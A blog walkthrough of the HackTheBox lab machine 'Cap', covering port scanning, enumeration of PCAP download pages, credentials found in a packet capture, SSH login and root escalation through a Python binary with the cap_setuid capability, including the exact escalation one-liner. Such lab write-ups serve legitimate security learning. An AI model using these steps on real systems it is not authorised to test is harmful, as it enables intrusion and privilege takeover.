---
layout: post
title: Cap
date: 2025-07-05 10:00:00 +0100
categories: [Walkthroughs]
tags: [hackthebox, linux, web-app,pcap,wireshark, linux privesc]
---
![alt text](https://labs.hackthebox.com/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | HackTheBox       |
| OS | Linux        |
| Difficulty | Easy        |
| Release Date | 21 June 2021        |
| Link to machine | [Boardlight](https://app.hackthebox.com/machines/Cap)        |

# Highlights
Wireshark, PCAP, Linux Enumeration, Capabilities, SUID, Linux Privilege Escalation

---

# Open ports enumeration
Nmap scan

```bash
nmap -T4 -p- -A 10.10.10.245 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 12:22 BST
Nmap scan report for 10.10.10.245
Host is up (0.062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   54.90 ms 10.10.16.1
2   28.31 ms 10.10.10.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.77 seconds
```

Nmap returns open ports for ```SSH``` (Port 22) and a web server ```HTTP```  (Port 80) ```(http Gunicorn)``` and ```FTP``` (Port 21). 

# FTP Enumeration
```FTP``` anonymous login is ```disabled```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap1.png?raw=true)
# SSH Enumeration
```SSH``` password authentication is ```enabled```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap2.png?raw=true)



# HTTP Enumeration

Navigating to ```http://10.10.10.245:80``` allows us to access to a Dashboard with the user ```Nathan```.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap3.png?raw=true)

In the left menu under ```Dashboard```, we can find the following options , with the most interesting one being ```Security Snapshot (5 Second PCAP + Analysis)``` that takes us to the page ```http://10.10.10.245/data/1```

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap4.png?raw=true)

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap5.png?raw=true)


Being ```PCAP``` files packet captures, we are interested in getting our hands on those files if they are available in any of those directories.
Using ```dirsearch```, we enumerate the existing files present in the data directory, excluding pages that return error codes ```403,500 and 400```.
The remain results are 4 pages : ```01,0,00 and 1```
```bash
dirsearch -u http://10.10.10.245/data -x 403,500,404                                     

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                                             
                                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Cap/reports/http_10.10.10.245/_data_25-07-05_12-31-15.txt

Target: http://10.10.10.245/

[12:31:15] Starting: data/                                                                                                                                          
[12:31:23] 200 -   17KB - /data/01                                          
[12:31:23] 200 -   17KB - /data/0                                           
[12:31:23] 200 -   17KB - /data/00                                          
[12:31:23] 200 -   17KB - /data/1 
```

Navigating to each page, we discover that the file ```0```, contains some information, so we download it and open the file with ```Wireshark```.

![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap6.png?raw=true)



# PCAP file examination with Wireshark

Opening the ```PCAP``` file with Wireshark for examination, on line ```36``` and ```40```, we can find cleartext credentials for the user ```Nathan```.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/cap/Cap7.png?raw=true)

# Foothold and user flag
These credentials allow us to connect to the target both using FTP or SSH, so we are going to use SSH, collect the ```user flag```, and start enumeration of the system to escalate privileges to root.
```bash
ssh nathan@10.10.10.245 
nathan@cap:~$ whoami
nathan
nathan@cap:~$ hostname
cap
nathan@cap:~$ 


nathan@cap:~$ ls -la
total 28
drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
drwxr-xr-x 3 root   root   4096 May 23  2021 ..
lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
drwx------ 2 nathan nathan 4096 May 23  2021 .cache
-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
-r-------- 1 nathan nathan   33 Jul  5 11:24 user.txt
```
We can now collect the ```user.txt``` flag and start enumerating the system.


# Privilege Escalation and root flag
Enumerating the system we come across ```cap_setuid``` capability
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
Based on the output from the commands used above, the /usr/bin/python3.8 binary has the cap_setuid capabilities assigned, which allows to set the effective user ID of a process when running its binary i.e. executing binaries as root.
Aaccording to GTFOBins, it can be easily exploited with the following command, which simply executes ```/bin/sh``` with the SUID bit set: ```/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")’```

```bash
nathan@cap:~$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@cap:~# 
root@cap:~# pwd
/home/nathan
root@cap:~# cd /
root@cap:/# cd root
root@cap:/root# ls -la
total 36
drwx------  6 root root 4096 Jul  5 11:24 .
drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 May 23  2021 .cache
drwxr-xr-x  3 root root 4096 May 23  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 May 23  2021 .ssh
lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
-r--------  1 root root   33 Jul  5 11:24 root.txt
drwxr-xr-x  3 root root 4096 May 23  2021 snap
```

We can now collect the root flag,

Enjoy!


